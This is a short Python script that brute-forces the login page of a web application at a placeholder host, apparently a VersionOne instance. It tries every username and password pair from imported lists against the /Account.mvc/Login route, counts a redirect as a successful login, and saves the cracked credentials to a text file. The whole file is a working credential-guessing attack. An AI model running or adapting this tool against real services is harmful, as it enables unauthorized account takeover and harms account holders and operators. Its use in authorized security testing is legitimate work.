#!/usr/bin/python3
import sys
import requests

from nousers import construct_unames, construct_passwords

default_url = "http://<v1host>/<instancename>"
login_route = "/Account.mvc/Login"
logout_route = "/Account.mvc/LogOut"

unames = construct_unames()
print("constructed {0} usernames for brute forcing...".format(len(unames)))

passwords = construct_passwords()
total_requests = len(unames) * len(passwords)
print("constructed {0} passwords for brute forcing...".format(len(passwords)))
prompt = "{0} web requests will be generated.  Do you want to continue?  (Y/n)  ".format(total_requests)
result = input(prompt)
if not result == "Y":
    print('quitter!')
    sys.exit(0)

r = requests.get(default_url)

if not r.status_code == 200:
    print("Exiting:  invalid url {0}".format(default_url))
    sys.exit(1)

cracked_accounts = []

cnt = 0

for uname in unames:
    for pw in passwords:
        r = requests.post(default_url + login_route, data = {'username': uname, 'password': pw, 'Destination': ''})
        cnt = cnt + 1
        update = "working...{0} of {1} requests made\r".format(cnt, total_requests)
        print(update, end="", flush=True)
        if len(r.history) == 0:
            continue
        combo = "{0}:{1}".format(uname, pw)
        cracked_accounts.append(combo)


if len(cracked_accounts) > 0:
    file = open("blackbox_cracked_accounts.txt", "w")
    for account in cracked_accounts:
        file.write(account)
